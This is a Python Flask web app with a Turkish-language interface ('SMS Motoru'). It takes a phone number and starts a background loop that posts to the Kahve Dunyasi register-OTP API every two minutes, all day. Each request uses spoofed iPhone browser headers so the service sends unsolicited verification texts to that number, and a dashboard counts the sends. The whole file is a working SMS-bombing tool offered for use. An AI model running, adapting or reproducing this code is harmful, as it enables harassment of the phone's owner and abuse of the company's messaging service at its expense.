import os
import time
import threading
import requests
from flask import Flask, render_template_string, request, redirect, url_for

app = Flask(__name__)

target_phone = ""
sms_count    = 0
last_status  = ""
_started     = False
_lock        = threading.Lock()

def send_sms():
    global sms_count, last_status
    if not target_phone:
        return
    try:
        r = requests.post(
            "https://www.kahvedunyasi.com/api/v1/auth/register-otp",
            json={"mobile_number": target_phone, "country_code": "90"},
            headers={
                "Content-Type":    "application/json",
                "Accept":          "application/json, text/plain, */*",
                "Accept-Language": "tr-TR,tr;q=0.9",
                "Origin":          "https://www.kahvedunyasi.com",
                "Referer":         "https://www.kahvedunyasi.com/",
                "User-Agent":      "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) "
                                   "AppleWebKit/605.1.15 (KHTML, like Gecko) "
                                   "Version/16.5 Mobile/15E148 Safari/604.1",
            },
            timeout=15,
        )
        sms_count += 1
        last_status = f"Son: {time.strftime('%H:%M')} — HTTP {r.status_code}"
    except requests.exceptions.ConnectionError:
        last_status = f"Baglanti Hatasi: {time.strftime('%H:%M')}"
    except requests.exceptions.Timeout:
        last_status = f"Zaman Asimi: {time.strftime('%H:%M')}"
    except Exception:
        last_status = f"Hata: {time.strftime('%H:%M')}"

def _loop():
    while True:
        time.sleep(120)
        send_sms()

@app.before_request
def boot():
    global _started
    with _lock:
        if not _started:
            _started = True
            threading.Thread(target=_loop, daemon=True).start()

PAGE = r"""<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>SMS Motoru</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap');
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Inter',sans-serif;background:#0a0a0f;min-height:100vh;
     display:flex;align-items:center;justify-content:center;padding:24px}
.wrap{width:100%;max-width:400px}
.brand{text-align:center;margin-bottom:36px}
.icon{width:54px;height:54px;background:linear-gradient(135deg,#6366f1,#8b5cf6);
      border-radius:16px;display:flex;align-items:center;justify-content:center;
      margin:0 auto 12px;font-size:22px}
.brand h1{font-size:19px;font-weight:600;color:#fff}
.brand p{font-size:12px;color:#44445a;margin-top:3px}
.card{background:#111118;border:1px solid #1e1e30;border-radius:20px;padding:30px}
.ig{position:relative;margin-bottom:14px}
.pre{position:absolute;left:15px;top:50%;transform:translateY(-50%);
     color:#44445a;font-size:14px;pointer-events:none}
input[type=tel]{width:100%;padding:14px 14px 14px 46px;background:#0c0c18;
  border:1.5px solid #1e1e30;border-radius:12px;color:#fff;font-size:15px;
  font-family:'Inter',sans-serif;outline:none;transition:border-color .2s}
input[type=tel]:focus{border-color:#6366f1}
input[type=tel]::placeholder{color:#333}
button{width:100%;padding:14px;
  background:linear-gradient(135deg,#6366f1,#8b5cf6);
  color:#fff;border:none;border-radius:12px;font-size:14px;font-weight:600;
  font-family:'Inter',sans-serif;cursor:pointer;transition:opacity .2s}
button:hover{opacity:.88}
.ab{text-align:center}
.check{width:60px;height:60px;background:linear-gradient(135deg,#10b981,#059669);
  border-radius:50%;display:flex;align-items:center;justify-content:center;
  margin:0 auto 18px;font-size:26px}
.at{font-size:16px;font-weight:600;color:#fff;margin-bottom:5px}
.ap{font-size:12px;color:#6366f1;font-weight:500;margin-bottom:22px}
.stats{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:18px}
.stat{background:#0c0c18;border:1px solid #1e1e30;border-radius:12px;padding:13px;text-align:center}
.sv{font-size:20px;font-weight:700;color:#fff}
.sl{font-size:10px;color:#44445a;margin-top:2px;text-transform:uppercase;letter-spacing:.5px}
.ls{font-size:11px;color:#44445a;margin-bottom:18px;min-height:16px}
.pulse{display:inline-flex;align-items:center;gap:6px;background:#0b1a12;
  border:1px solid #064e35;border-radius:20px;padding:5px 13px;
  font-size:11px;color:#10b981;font-weight:500}
.dot{width:7px;height:7px;background:#10b981;border-radius:50%;animation:bl 1.4s infinite}
@keyframes bl{0%,100%{opacity:1}50%{opacity:.15}}
.reset{display:block;margin-top:14px;text-align:center;font-size:11px;
  color:#2a2a3a;text-decoration:none;transition:color .2s}
.reset:hover{color:#6366f1}
</style>
{% if phone %}<script>setTimeout(()=>location.reload(),20000)</script>{% endif %}
</head>
<body>
<div class="wrap">
  <div class="brand">
    <div class="icon">☕</div>
    <h1>SMS Motoru</h1>
    <p>Kahve Dunyasi OTP Sistemi</p>
  </div>
  <div class="card">
    {% if phone %}
      <div class="ab">
        <div class="check">✓</div>
        <div class="at">SMS Baslatildi</div>
        <div class="ap">+90 {{ phone }}</div>
        <div class="stats">
          <div class="stat"><div class="sv">{{ count }}</div><div class="sl">Gonderim</div></div>
          <div class="stat"><div class="sv">2 dk</div><div class="sl">Aralik</div></div>
        </div>
        <div class="ls">{{ status or 'Ilk gonderi 2 dakika sonra...' }}</div>
        <div class="pulse"><div class="dot"></div>Sistem Aktif - 24 Saat</div>
        <a class="reset" href="/reset">Numarayi Degistir</a>
      </div>
    {% else %}
      <form method="POST" action="/">
        <div class="ig">
          <span class="pre">+90</span>
          <input type="tel" name="phone" placeholder="5051234567" maxlength="10" required autofocus>
        </div>
        <button type="submit">SMS Gonderimi Baslat</button>
      </form>
    {% endif %}
  </div>
</div>
</body>
</html>"""

@app.route("/", methods=["GET", "POST"])
def index():
    global target_phone
    if request.method == "POST":
        p = request.form.get("phone", "").strip()
        if p:
            target_phone = p
        return redirect(url_for("index"))
    return render_template_string(PAGE, phone=target_phone, count=sms_count, status=last_status)

@app.route("/reset")
def reset():
    global target_phone, sms_count, last_status
    target_phone = ""
    sms_count    = 0
    last_status  = ""
    return redirect(url_for("index"))

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)
